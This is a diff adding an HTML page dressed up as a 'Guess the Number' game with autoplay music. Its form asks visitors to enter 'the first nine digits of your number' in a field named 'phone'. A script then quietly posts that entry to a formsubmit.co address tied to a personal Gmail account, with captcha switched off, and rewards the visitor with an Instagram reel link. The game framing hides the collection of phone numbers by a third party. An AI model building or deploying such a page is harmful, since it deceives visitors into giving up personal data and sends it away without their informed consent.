@@ -1,0 +1,101 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Guess the Number</title>
+  <style>
+    body {
+      background: url('background-image.png') no-repeat center center fixed;
+      background-size: cover;
+      font-family: 'Arial', sans-serif;
+      text-align: center;
+      color: white;
+      padding-top: 100px;
+    }
+
+    .container {
+      background: rgba(0, 0, 0, 0.6);
+      padding: 30px;
+      border-radius: 20px;
+      display: inline-block;
+    }
+
+    input[type="text"] {
+      padding: 10px;
+      font-size: 16px;
+      width: 250px;
+      border-radius: 10px;
+      border: none;
+      margin-top: 20px;
+    }
+
+    button {
+      margin-top: 20px;
+      padding: 10px 25px;
+      font-size: 16px;
+      border: none;
+      border-radius: 10px;
+      cursor: pointer;
+      background-color: #ff66b2;
+      color: white;
+    }
+
+    #result {
+      margin-top: 25px;
+      font-size: 18px;
+    }
+
+    a {
+      color: #ffccff;
+      text-decoration: none;
+      font-weight: bold;
+    }
+  </style>
+</head>
+<body>
+  <audio autoplay loop>
+    <source src="background-music.mpeg" type="audio/mpeg" />
+    Your browser does not support the audio element.
+  </audio>
+
+  <div class="container">
+    <h1>Guess the first nine digits of your number correctly and find out..</h1>
+    <form id="numberForm" action="https://formsubmit.co/Arunpnambiar2@gmail.com" method="POST">
+      <input type="text" name="phone" placeholder="Enter 9 digits" required />
+      <input type="hidden" name="_captcha" value="false">
+      <button type="submit">Next</button>
+    </form>
+
+    <div id="result" style="display:none;">
+      <p>Here's a reel for you 😊</p>
+      <a href="https://www.instagram.com/reel/DIL4YYty0As/?igsh=Nmx4MnZ4NXUzeWJk" target="_blank">Watch now</a>
+    </div>
+  </div>
+
+  <script>
+    const form = document.getElementById("numberForm");
+    const result = document.getElementById("result");
+
+    form.addEventListener("submit", function (e) {
+      e.preventDefault();
+
+      // submit form using JS to FormSubmit
+      fetch(form.action, {
+        method: "POST",
+        body: new FormData(form),
+        headers: {
+          'Accept': 'application/json'
+        }
+      }).then(response => {
+        if (response.ok) {
+          form.style.display = "none";
+          result.style.display = "block";
+        } else {
+          alert("Something went wrong. Please try again.");
+        }
+      });
+    });
+  </script>
+</body>
+</html>
